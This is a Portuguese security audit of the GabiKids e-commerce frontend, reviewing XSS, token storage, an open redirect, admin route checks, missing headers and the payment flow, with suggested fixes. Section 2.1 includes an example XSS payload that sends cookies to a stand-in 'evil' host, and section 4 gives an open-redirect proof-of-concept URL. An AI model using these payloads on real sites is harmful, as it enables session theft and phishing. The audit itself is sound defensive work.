# Auditoria de Segurança — Frontend GabiKids (ecommerce-vanilla-frontend)

**Escopo:** todos os arquivos `.js` (raiz de `js/` e `js/admin/`) e `.html` (raiz e `admin/`) do frontend estático.
**Fora de escopo:** código do backend (repo `ecommerce`), configuração de servidor/Nginx (não versionada neste repositório).
**Metodologia:** leitura integral de cada arquivo `.js`, varredura por padrões (`innerHTML`, `localStorage`, `redirect`, `<script src=`, segredos hardcoded) e verificação cruzada de cada ocorrência no contexto real de uso.

---

## Resumo executivo

| # | Categoria | Pior severidade encontrada |
|---|---|---|
| 1 | Dados sensíveis expostos | BAIXO |
| 2 | XSS | MÉDIO |
| 3 | Armazenamento inseguro | ALTO |
| 4 | Open redirect | ALTO |
| 5 | Proteção de rotas admin | BAIXO |
| 6 | Scripts externos sem SRI | MÉDIO |
| 7 | Headers de segurança ausentes | MÉDIO (responsabilidade do servidor) |
| 8 | Fluxo de pagamento | MÉDIO |

Nenhum problema **CRÍTICO** foi identificado. Os dois pontos de maior atenção são o **open redirect pós-login** (item 4) e o **armazenamento de refresh token em `localStorage`** (item 3) — ambos de correção barata e ambos citados explicitamente no pedido de auditoria.

---

## 1. Dados sensíveis expostos no código

### 1.1 — Chave pública do Mercado Pago hardcoded, em modo TEST
**Arquivo:** `js/checkout.js:1`
```js
const MP_PUBLIC_KEY = 'TEST-b5bead85-7a42-49c2-af4b-59cc3efea9cb';
```
**Severidade: BAIXO**
Chaves *públicas* do Mercado Pago são projetadas para viver no client (equivalente à `publishable key` do Stripe) — não são segredo por si só e não permitem cobrar, estornar ou acessar dados sensíveis. O problema real aqui é **operacional**: a chave está fixa no código-fonte, prefixada `TEST-` (sandbox), sem nenhum mecanismo de troca por ambiente (dev/staging/produção). Se este arquivo for publicado em produção sem alteração manual, todos os pagamentos cairão silenciosamente em modo sandbox — ou, no sentido inverso, uma chave de produção pode acabar commitada por engano no futuro.

**Correção sugerida:** injetar a chave em tempo de build/deploy (ex.: um pequeno arquivo `config.js` gerado pelo pipeline de deploy e listado no `.gitignore`, ou uma variável definida no `<head>` do HTML por ambiente) em vez de literal no `.js` versionado.

### 1.2 — Código morto revelando URL de desenvolvimento
**Arquivo:** `js/api.js:1-2`
```js
//const API_BASE = 'http://localhost:8080';
const API_BASE = 'https://gabikids.duckdns.org';
```
**Severidade: BAIXO**
Não é um segredo, mas é ruído versionado que expõe o fluxo de desenvolvimento local. Mais relevante: assim como a chave do MP, não há troca de ambiente — trocar entre local/produção depende de comentar/descomentar uma linha manualmente, o que é frágil e já gerou (nesta mesma base de código) commits com a URL errada ativa.

**Correção sugerida:** remover a linha comentada; centralizar `API_BASE` em um único ponto configurável por ambiente (mesmo que seja só um `<script>` de config carregado antes de `api.js`, com um valor diferente por ambiente de deploy).

### 1.3 — Nenhum segredo real encontrado
Varredura por padrões de chaves de nuvem (`AKIA...`, `AIza...`, `sk_live_...`, blocos `PRIVATE KEY`) e por arquivos `.env`/credenciais versionados: **nada encontrado**. `design-reference/` e `img/` (ativos de referência de design) já estão corretamente no `.gitignore`.

---

## 2. Vulnerabilidades XSS

O projeto usa consistentemente uma função `escapeHtml()` (`js/api.js:146-150`, via `textContent` de um `<div>` — implementação correta) para escapar dados vindos da API antes de inserir em `innerHTML`. A varredura de **todas** as interpolações `${...}` dentro de sinks `innerHTML` confirma que isso é seguido de forma consistente, com duas exceções:

### 2.1 — `product.imageUrl` inserido sem escapar em atributo `src`
**Arquivos:** `js/api.js:208`, `js/product.js:27`, `js/admin/products.js:63` e `js/admin/products.js:132`
```js
`<img src="${product.imageUrl}" alt="${escapeHtml(product.name)}" />`
```
**Severidade: MÉDIO**
`product.name` é escapado corretamente na mesma linha, mas `product.imageUrl` não é — apesar de estar dentro do mesmo atributo HTML de risco. Se `imageUrl` contivesse um caractere `"`, o atributo se romperia, permitindo injetar HTML/atributos arbitrários (ex.: `" onerror="fetch('https://evil/steal?c='+document.cookie)`).

Na prática, hoje `imageUrl` só é populado pelo backend após upload via `POST /products/{id}/image` (retorna uma URL gerada pelo R2, sem input livre de texto no admin) — por isso a exploração direta é improvável no fluxo atual. Ainda assim, é uma inconsistência real de defesa em profundidade: a mesma função já é usada ao lado, e o custo da correção é zero.

**Correção sugerida:**
```js
`<img src="${escapeHtml(product.imageUrl)}" alt="${escapeHtml(product.name)}" />`
```
Aplicar nos 4 locais listados.

### 2.2 — QR Code Pix (base64) inserido sem escapar
**Arquivo:** `js/checkout.js:209`
```js
<img class="pix-qr-image" src="data:image/png;base64,${result.pixQrCodeBase64}" alt="QR Code Pix" />
```
**Severidade: BAIXO**
O alfabeto base64 (`A-Z a-z 0-9 + / =`) não contém `"` nem `<`, então não é possível quebrar o atributo com uma imagem base64 válida. O risco só existiria se o backend/Mercado Pago devolvesse uma string corrompida ou manipulada (ex.: falha de TLS/MITM). Ainda assim, recomenda-se validar o formato antes de usar, por robustez:
```js
const isValidBase64 = /^[A-Za-z0-9+/]+=*$/.test(result.pixQrCodeBase64 || '');
```

### 2.3 — Ponto seguro por sorte, não por design (flagar para não regredir)
**Arquivo:** `js/admin/products.js:306`
```js
: `Nova Variação — ${product.name}`
```
Este título é passado para `openModal({ title })`, e `js/modal.js:31` faz `header.querySelector('h3').textContent = title || ''` — ou seja, **é seguro hoje porque o sink usa `textContent`, não `innerHTML`**. Não é uma vulnerabilidade agora, mas é uma inconsistência: se algum dia o `modal.js` for alterado para aceitar título HTML (ex. para permitir ícones no título), este ponto se tornaria uma XSS silenciosa. **Severidade: BAIXO** — recomenda-se escapar por consistência mesmo assim (`escapeHtml(product.name)`), tratando `escapeHtml()` como padrão obrigatório em toda interpolação de dado de API, independente do sink atual.

### 2.4 — Parâmetros de query: nenhum vetor de injeção encontrado
Todos os parâmetros de URL lidos pelo app (`redirect`, `token`, `id`, `orderId`, `q`, `category`) foram rastreados até seu uso final:
- `token` (`resetar-senha.js`, `confirmar-alteracao-senha.js`) — usado apenas como valor de payload de API (`encodeURIComponent` na querystring, ou campo de JSON), nunca inserido no DOM.
- `q` (`shop.js`) — usado só em `.toLowerCase().includes()` para filtrar produtos já carregados; nunca ecoado de volta na página.
- `category` (`shop.js`) — comparado contra IDs reais vindos da API; o nome exibido no breadcrumb usa `.textContent` (`shop.js:66`), não `innerHTML`.

**Nenhum problema encontrado nesta subcategoria.**

---

## 3. Armazenamento inseguro

**Arquivo:** `js/storage.js`

### 3.1 — Access token e refresh token juntos em `localStorage`
```js
localStorage.setItem(STORAGE_KEYS.ACCESS_TOKEN, accessToken);
localStorage.setItem(STORAGE_KEYS.REFRESH_TOKEN, refreshToken);
```
**Severidade: ALTO**
`localStorage` é acessível por qualquer script rodando no mesmo documento — inclusive um script injetado via XSS. Guardar **apenas** o access token ali já seria um risco aceito comum em SPAs; guardar também o **refresh token** eleva o impacto: um XSS pontual (mesmo de curta duração) permite a um atacante gerar novos access tokens indefinidamente, resultando em sequestro de sessão persistente, não apenas temporário.

**Correção sugerida (em ordem de preferência):**
1. Mover o refresh token para um **cookie `HttpOnly` + `Secure` + `SameSite=Strict`**, setado pelo backend na resposta de login (exige mudança no backend: o endpoint de refresh passaria a ler o cookie automaticamente enviado pelo browser, em vez de receber o token no corpo da requisição). Isso torna o refresh token inacessível a JavaScript, mesmo sob XSS.
2. Se a mudança de backend não for viável no curto prazo, ao menos reduzir a superfície: nunca logar o valor, garantir TTL curto no refresh token do lado do servidor, e tratar qualquer XSS encontrado como incidente de sessão comprometida (invalidar refresh tokens ativos).

### 3.2 — Claims do JWT decodificadas e duplicadas em `localStorage.user`
**Arquivo:** `js/storage.js:24-37`
```js
const claims = decodeJwt(accessToken);
const user = claims ? { id: claims.id, email: claims.sub, name: claims.name, role: claims.role } : null;
localStorage.setItem(STORAGE_KEYS.USER, JSON.stringify(user));
```
**Severidade: MÉDIO**
Nome e e-mail do usuário passam a existir em texto plano em `localStorage`, além de já estarem dentro do próprio JWT (que também é decodificável por qualquer um com acesso ao token, então não é uma nova exposição de dado — é uma duplicação). O ponto de atenção real é que este objeto é **livremente editável** via DevTools (`localStorage.setItem('user', ...)`), o que é aceitável *desde que* nenhuma decisão de autorização real dependa dele sem verificação server-side — ver item 5.

**Correção sugerida:** nenhuma ação obrigatória; se o time quiser reduzir a superfície, poderia decodificar o JWT sob demanda (`getCurrentUser()` chamando `decodeJwt(getAccessToken())` a cada leitura) em vez de persistir uma cópia solta, eliminando a divergência entre `user` e o token real.

### 3.3 — Sem flags de expiração/rotação visíveis no client
O client não impõe TTL próprio sobre os tokens armazenados; depende inteiramente da expiração embutida no JWT e da resposta 401 do backend para disparar `refreshAccessToken()` (`js/api.js:24-47`). Isso é o padrão esperado — **não é um problema**, só está registrado aqui porque foi verificado.

---

## 4. Open Redirect

**Arquivo:** `js/auth.js:32-40`
```js
function redirectAfterLogin(user) {
  const params = new URLSearchParams(window.location.search);
  const redirect = params.get('redirect');

  if (user.role === 'ADMIN') {
    window.location.href = 'admin/index.html';
    return;
  }
  window.location.href = redirect ? decodeURIComponent(redirect) : 'index.html';
}
```
**Severidade: ALTO**

O parâmetro `redirect` vem **diretamente da URL**, é decodificado e usado como destino de `window.location.href` **sem nenhuma validação** de que é um caminho relativo/mesmo-domínio. `window.location.href` aceita URLs absolutas de qualquer origem.

**Prova de conceito:**
```
https://gabikids.duckdns.org/auth.html?redirect=https%3A%2F%2Fsite-malicioso.exemplo%2Ffake-login
```
Uma vítima que clique nesse link (ele aponta para o domínio real, o que passa despercebido em verificações superficiais) faz login normalmente no site legítimo — e, exatamente por ter tido sucesso no login real, é redirecionada com credibilidade reforçada para o domínio do atacante, que pode montar uma segunda tela de phishing, cobrar dados de cartão falsos, ou distribuir malware.

Vale notar que `requireAuth()` (`js/auth.js:15-20`) e o handler de 401 em `apiFetch` (`js/api.js:73-76`) **constroem** o valor de `redirect` internamente a partir de `window.location.pathname` — essas duas origens são seguras porque o valor nunca vem de fora. O problema é exclusivamente no **consumo** do parâmetro em `redirectAfterLogin`.

**Correção sugerida:** validar que o valor é um caminho relativo interno antes de usar:
```js
function isSafeRedirect(path) {
  return typeof path === 'string' && /^[a-zA-Z0-9/_-]+\.html([?#].*)?$/.test(path) && !path.startsWith('//');
}

function redirectAfterLogin(user) {
  const params = new URLSearchParams(window.location.search);
  const redirect = params.get('redirect');
  const decoded = redirect ? decodeURIComponent(redirect) : null;

  if (user.role === 'ADMIN') {
    window.location.href = 'admin/index.html';
    return;
  }
  window.location.href = decoded && isSafeRedirect(decoded) ? decoded : 'index.html';
}
```
O ponto chave é rejeitar qualquer valor que comece com `http://`, `https://`, `//` (protocol-relative) ou contenha `\\`/caracteres de esquema — aceitando apenas nomes de página internos conhecidos.

---

## 5. Proteção de rotas admin

**Arquivos:** `js/auth.js:23-29` (`requireAdmin`), `js/storage.js:60-63` (`isAdmin`)
```js
function isAdmin() {
  const user = getCurrentUser(); // lido de localStorage, editável via DevTools
  return !!user && user.role === 'ADMIN';
}

function requireAdmin() {
  if (!isAuthenticated() || !isAdmin()) {
    window.location.href = `${resolveRootPath()}index.html`;
    return false;
  }
  return true;
}
```
**Severidade: BAIXO** (ver justificativa)

`requireAdmin()` é **inteiramente client-side** e depende de um objeto (`localStorage.user`) trivialmente editável no DevTools — qualquer visitante pode setar `role: "ADMIN"` manualmente e fazer essa função "passar", vendo o layout de `admin/*.html` renderizado.

Isso **não constitui**, por si só, uma vulnerabilidade de autorização, porque toda ação real feita a partir das páginas admin passa pela mesma camada de API já protegida no backend (confirmado no `SecurityConfig` do projeto backend, fora deste repositório):
- `GET /categories` e `GET /products` são **públicos** (`permitAll()`) — os mesmos dados já são visíveis por qualquer visitante em `shop.html`. Bypass do gate não vaza nada nesse ponto.
- `GET /orders` exige autenticação e é **sempre filtrado pelo usuário autenticado no JWT real**, independente de role — um "admin" falsificado no client só veria os próprios pedidos (se algum), nunca os de terceiros.
- `POST`/`PUT`/`DELETE` em `/products`, `/categories` e `PUT /orders/{id}/status` exigem role `ADMIN` **validada no JWT assinado pelo servidor** — editar `localStorage.user.role` não altera o JWT real enviado no header `Authorization`, então essas chamadas continuam retornando 403 para um usuário não-admin genuíno.

Ou seja: o bypass do gate client-side expõe apenas o **HTML/CSS/JS da interface admin** (estrutura de tabelas, formulários, textos) a um visitante curioso — não expõe dados protegidos nem permite mutações reais, **desde que o backend continue aplicando essas regras** (esta auditoria não teve acesso ao backend para reverificar; a conclusão acima se baseia no comportamento documentado/observado do projeto até o momento).

**Correção sugerida (endurecimento opcional, não crítico):**
- Antes de renderizar o layout admin, fazer uma checagem "ping" contra um endpoint autenticado real (ex. `GET /orders` já teria que ser chamado mesmo assim) e só desenhar a página em caso de sucesso — evita que o HTML/estrutura do painel seja exibido para quem não tem sessão real, reduzindo reconhecimento por um atacante.
- Deixar documentado (código ou README) que `requireAdmin()` é **UX**, não controle de segurança, para que nenhum desenvolvedor futuro assuma o contrário ao adicionar novas telas admin.

---

## 6. Scripts externos sem integridade (SRI)

```bash
$ grep -rn '<script src="https' *.html admin/*.html
checkout.html:58:  <script src="https://sdk.mercadopago.com/js/v2"></script>
```

### 6.1 — SDK do Mercado Pago sem `integrity`/`crossorigin`
**Arquivo:** `checkout.html:58`
**Severidade: MÉDIO**
É o único `<script>` externo do projeto. Não tem `integrity` (SRI) nem `crossorigin`.

Ressalva importante: o endpoint `/js/v2` do Mercado Pago é **deliberadamente "rolling"** (a MP publica correções e novas versões no mesmo caminho, sem versionar a URL) — por isso, um hash SRI fixo quebraria a integração assim que a MP atualizasse o arquivo, o que a própria documentação da MP desaconselha travar via SRI. Isso não é uma desculpa para deixar o risco sem tratamento: significa que o SRI clássico não é a ferramenta certa aqui.

**Correção sugerida:**
- Adicionar `crossorigin="anonymous"` (não quebra nada, melhora relatórios de erro e é pré-requisito caso SRI seja adotado no futuro).
- Garantir que a página só seja servida via HTTPS (parece já ser o caso pelo domínio) para que o script não seja adulterado em trânsito.
- Se a MP oferecer no futuro uma versão pinada (`/js/v2.x.y`), reavaliar o uso de SRI nela.
- Considerar um **CSP** com `script-src` restrito a `'self' https://sdk.mercadopago.com` (ver item 7) como camada adicional de controle sobre *quais* domínios podem servir script na página, já que SRI sozinho não impede a inclusão de outros scripts maliciosos.

### 6.2 — Google Fonts via `@import` no CSS
**Arquivo:** `css/global.css:1`
```css
@import url('https://fonts.googleapis.com/css2?family=Playfair+Display...');
```
**Severidade: BAIXO**
`@import` de CSS não tem mecanismo de SRI (a spec não suporta `integrity` em `@import`). O risco é baixo (Google Fonts, HTTPS, sem histórico de comprometimento relevante), mas vale registrar como uma dependência externa sem verificação de integridade. Trocar para um `<link rel="stylesheet" href="..." crossorigin>` no `<head>` de cada página permitiria pelo menos usar `crossorigin` e melhoraria performance (elimina o bloqueio sequencial que `@import` causa), mas SRI continua não sendo aplicável a fontes que mudam com frequência.

---

## 7. Ausência de headers de segurança

Este repositório contém apenas arquivos estáticos — não há `nginx.conf`, `.htaccess` ou qualquer configuração de servidor versionada aqui. Os itens abaixo **não podem ser corrigidos neste repositório**; ficam registrados para implementação na camada de servidor (Nginx, conforme mencionado no contexto do projeto).

**Severidade: MÉDIO** (a ausência, por si só, amplia o impacto dos achados de XSS/clickjacking listados acima — não é uma vulnerabilidade isolada, é a falta de uma rede de segurança).

| Header ausente | Risco que mitigaria |
|---|---|
| `Content-Security-Policy` | Reduz drasticamente o impacto de qualquer XSS futura (mesmo as já corrigidas nesta auditoria); pode bloquear exfiltração via `fetch`/`img` para domínios não whitelistados |
| `X-Frame-Options: DENY` (ou `frame-ancestors 'none'` na CSP) | Previne clickjacking (nenhuma página deste site precisa ser embutida em `<iframe>` de terceiros) |
| `X-Content-Type-Options: nosniff` | Previne MIME-sniffing que poderia fazer o browser executar um arquivo enviado (ex. upload de imagem malformado) como script |
| `Referrer-Policy: strict-origin-when-cross-origin` | Evita vazar a URL completa (que pode conter `?token=` de reset de senha!) para terceiros via header `Referer`, por exemplo ao carregar o SDK da MP ou fontes do Google |
| `Strict-Transport-Security` | Força HTTPS em conexões futuras ao domínio |
| `Permissions-Policy` | Desabilita APIs de browser não usadas (câmera, geolocalização, etc.) |

**Atenção especial ao `Referrer-Policy`:** as URLs de `resetar-senha.html?token=...` e `confirmar-alteracao-senha.html?token=...` contêm tokens sensíveis na própria URL. Sem uma `Referrer-Policy` restritiva, se essas páginas carregassem qualquer recurso de terceiro (hoje não carregam, mas isso pode mudar), o token vazaria para esse terceiro via header `Referer`. Isso reforça a recomendação de, no mínimo, `Referrer-Policy: strict-origin-when-cross-origin` (ou mais restritivo) no servidor.

**Sugestão de configuração Nginx** (para o time de infra aplicar fora deste repo):
```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://sdk.mercadopago.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data: https://pub-*.r2.dev; connect-src 'self' https://gabikids.duckdns.org https://api.mercadopago.com; frame-ancestors 'none'" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains" always;
```
(A diretiva `img-src` precisa incluir o domínio real do bucket R2 usado para as imagens de produto; ajustar `style-src 'unsafe-inline'` seria o ideal remover, mas o projeto usa `style` inline gerado por alguns componentes do Mercado Pago Brick, que exige isso — validar em teste antes de remover.)

---

## 8. Fluxo de pagamento (`js/checkout.js`)

### 8.1 — Tokenização de cartão: correta ✅ (achado positivo)
O formulário de cartão é 100% renderizado pelo **CardPayment Brick** da SDK oficial da Mercado Pago (`js/checkout.js:129-176`). O callback `onSubmit` recebe apenas `cardFormData.token` (já tokenizado) — número de cartão, CVV e validade **nunca tocam este código nem trafegam para o backend da GabiKids**. Este é o padrão correto (compatível com PCI-DSS SAQ A). Nenhuma ação necessária.

### 8.2 — Valor cobrado não é enviado pelo client: correto ✅ (achado positivo)
```js
await apiPost('/payments/process', {
  orderId: order.id,
  paymentMethod: 'credit_card',
  token: cardFormData.token,
  installments: cardFormData.installments,
  cardIssuerId: cardFormData.payment_method_id,
});
```
Repare que **nenhum campo de valor/total é enviado** — só `orderId`. Isso significa que o backend precisa obrigatoriamente recalcular o valor a cobrar a partir do pedido armazenado no servidor, o que impede um usuário malicioso de adulterar o preço no client (um vetor clássico de fraude em e-commerces mal implementados). O campo `amount` usado em `initialization: { amount: Number(order.total) }` (linha 142) é usado **apenas para exibição** no Brick (cálculo de parcelas na UI) — não é reenviado ao backend.

### 8.3 — Polling de status do Pix sem timeout
**Arquivo:** `js/checkout.js:228-243`
```js
function startPixPolling(orderId) {
  if (pixPollInterval) clearInterval(pixPollInterval);
  pixPollInterval = setInterval(async () => {
    try {
      const orders = await apiGet('/orders');
      const updated = orders.find((o) => o.id === orderId);
      if (updated && updated.paymentStatus === 'approved') {
        clearInterval(pixPollInterval);
        showPaymentResult({ status: 'approved' });
      }
    } catch { /* ignora falhas de polling */ }
  }, 5000);
}
```
**Severidade: MÉDIO**
Não há limite de tentativas nem tempo máximo — se o usuário deixar a aba aberta sem pagar, o client faz `GET /orders` a cada 5 segundos **indefinidamente**, para sempre. Isso não é diretamente explorável contra terceiros, mas é:
- Desperdício de bateria/rede no cliente.
- Carga desnecessária e não limitada no backend por sessão (se muitos usuários abandonarem checkouts com abas abertas, o volume de polling cresce sem controle).
- Ausência de feedback ao usuário informando que o QR Code Pix expirou (QR Codes Pix normalmente têm validade de minutos, definida pelo banco/PSP).

**Correção sugerida:**
```js
const PIX_POLL_INTERVAL_MS = 5000;
const PIX_POLL_MAX_ATTEMPTS = 60; // 5 minutos

function startPixPolling(orderId) {
  if (pixPollInterval) clearInterval(pixPollInterval);
  let attempts = 0;

  pixPollInterval = setInterval(async () => {
    attempts += 1;
    if (attempts > PIX_POLL_MAX_ATTEMPTS) {
      clearInterval(pixPollInterval);
      showToast('O QR Code Pix expirou. Gere um novo código para continuar.', 'warning');
      return;
    }
    try {
      const orders = await apiGet('/orders');
      const updated = orders.find((o) => o.id === orderId);
      if (updated && updated.paymentStatus === 'approved') {
        clearInterval(pixPollInterval);
        showPaymentResult({ status: 'approved' });
      }
    } catch { /* ignora falhas de polling — tenta de novo no próximo tick */ }
  }, PIX_POLL_INTERVAL_MS);
}
```

### 8.4 — IDOR no acesso ao pedido do checkout: mitigado corretamente ✅
`initCheckoutPage()` busca `GET /orders` (retorna só os pedidos do usuário autenticado, conforme escopo do backend) e localiza o pedido pelo `orderId` da URL **dentro dessa lista já filtrada**. Um `orderId` de outro usuário simplesmente não aparece na lista — o "não encontrado" resultante depende da autorização do servidor, não de o ID ser difícil de adivinhar. Padrão correto.

### 8.5 — CSRF: mitigado pelo desenho da autenticação ✅
A API usa Bearer token lido de `localStorage` e enviado manualmente no header `Authorization` (`js/api.js:60-63`) — não usa cookies de sessão enviados automaticamente pelo browser. Isso elimina o vetor clássico de CSRF (que depende do browser anexar credenciais automaticamente a requisições cross-site). Nenhuma ação necessária aqui — mas isso reforça por que mover o refresh token para cookie `HttpOnly` (item 3.1) precisaria vir acompanhado de proteção CSRF própria (ex. `SameSite=Strict` já cobre a maior parte do risco para esse endpoint específico).

---

## Tabela consolidada de ações recomendadas

| # | Item | Severidade | Esforço de correção |
|---|---|---|---|
| 4 | Open redirect em `redirectAfterLogin` | **ALTO** | Baixo — validar allowlist de path relativo |
| 3.1 | Refresh token em `localStorage` | **ALTO** | Alto — requer mudança de backend (cookie HttpOnly) |
| 2.1 | `imageUrl` sem `escapeHtml()` em 4 pontos | MÉDIO | Trivial — 1 linha por ocorrência |
| 6.1 | MP SDK sem `crossorigin` | MÉDIO | Trivial — 1 atributo |
| 7 | Headers de segurança ausentes (CSP, X-Frame-Options, etc.) | MÉDIO | Médio — configuração de Nginx, fora deste repo |
| 8.3 | Polling Pix sem timeout | MÉDIO | Baixo — cap de tentativas |
| 3.2 | Claims do JWT duplicadas em `localStorage.user` | MÉDIO | Baixo — opcional, decodificar sob demanda |
| 1.1 | Chave MP de teste hardcoded sem config por ambiente | BAIXO | Médio — mecanismo de config por ambiente |
| 1.2 | Linha comentada expondo `localhost:8080` | BAIXO | Trivial — remover linha |
| 2.2 | QR Pix base64 sem validação de formato | BAIXO | Trivial |
| 2.3 | Título de modal não escapado (seguro só por `textContent`) | BAIXO | Trivial |
| 5 | `requireAdmin()` só client-side | BAIXO* | Opcional — depende de reconfirmar enforcement no backend |
| 6.2 | Google Fonts via `@import` sem SRI | BAIXO | N/A (SRI não se aplica a `@import`) |

\* Classificado como BAIXO nesta auditoria porque o backend (fora deste repositório) foi documentado como aplicando as mesmas regras de autorização de forma independente; recomenda-se à equipe reconfirmar isso diretamente no código do backend antes de aceitar esta classificação como definitiva.

---

## O que já está correto (achados positivos, para não perder de vista)

- `escapeHtml()` é usado de forma consistente em praticamente toda inserção de dado de API em `innerHTML`.
- Nenhum segredo real (chave de nuvem, chave privada, credencial de banco) encontrado no código versionado.
- Tokenização de cartão feita inteiramente pela SDK oficial da Mercado Pago — dado de cartão nunca trafega pelo código da loja.
- Valor cobrado no pagamento não é enviado pelo client — protege contra adulteração de preço.
- Autorização de pedidos (IDOR) depende do escopo do backend, não de obscuridade de ID no client.
- Uso de Bearer token (não cookie) elimina CSRF clássico.
- Parâmetros de busca e filtro (`q`, `category`) nunca são refletidos de forma insegura no DOM.
- `design-reference/` e ativos de design já estão no `.gitignore`, não expostos em produção.
